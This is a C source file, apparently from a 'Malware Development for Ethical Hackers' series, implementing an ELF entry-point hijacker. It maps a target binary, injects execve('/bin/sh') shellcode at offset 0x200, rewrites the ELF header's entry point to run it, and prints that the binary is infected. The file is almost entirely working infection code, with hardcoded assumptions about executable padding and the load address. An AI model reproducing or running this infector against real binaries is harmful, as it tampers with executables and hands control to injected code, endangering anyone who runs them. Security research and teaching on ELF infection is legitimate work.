/*
 * Malware Development for Ethical Hackers
 * hack2.c
 * ELF Entry Point Hijacker with shellcode injection (draft)
 * technique: overwriting Entry Point to point to injected payload
 * author: @cocomelonc
 */
#include <stdio.h>
#include <elf.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

// simple execve("/bin/sh") shellcode for x64 Linux
// this is used for educational verification only.
unsigned char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

int main(int argc, char* argv[]) {
  if (argc < 2) {
    printf("Usage: %s <target_elf>\n", argv[0]);
    return 1;
  }

  // open target binary with read/write permissions
  int fd = open(argv[1], O_RDWR);
  if (fd < 0) {
    perror("open");
    return 1;
  }

  // map the binary into memory
  off_t size = lseek(fd, 0, SEEK_END);
  uint8_t* mem = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (mem == MAP_FAILED) {
    perror("mmap");
    return 1;
  }

  Elf64_Ehdr* header = (Elf64_Ehdr*)mem;

  // basic ELF validation
  if (memcmp(header->e_ident, ELFMAG, SELFMAG) != 0) {
    printf("not a valid ELF file.\n");
    return 1;
  }

  // find the injection point (the "Cave")
  // for this PoC, we use the padding area after the ELF headers (usually offset 0x200)
  // in a real scenario, you must ensure this area is mapped into memory as EXECUTABLE.
  uint64_t injection_offset = 0x200; 
  
  // calculate the new Entry Point (Virtual Address)
  // most standard x64 binaries start their virtual mapping at 0x400000
  uint64_t original_entry = header->e_entry;
  uint64_t new_entry = 0x400000 + injection_offset; 

  printf("original Entry Point: 0x%lx\n", original_entry);
  printf("injecting shellcode at offset: 0x%lx\n", injection_offset);

  // perform the injection
  // copy the shellcode into the binary
  memcpy(mem + injection_offset, payload, sizeof(payload));

  // update the ELF header to point to our new entry point
  header->e_entry = new_entry;
  printf("new Entry Point set to: 0x%lx\n", header->e_entry);

  // synchronize memory and cleanup
  msync(mem, size, MS_SYNC);
  munmap(mem, size);
  close(fd);

  printf("binary successfully infected.\n");
  return 0;
}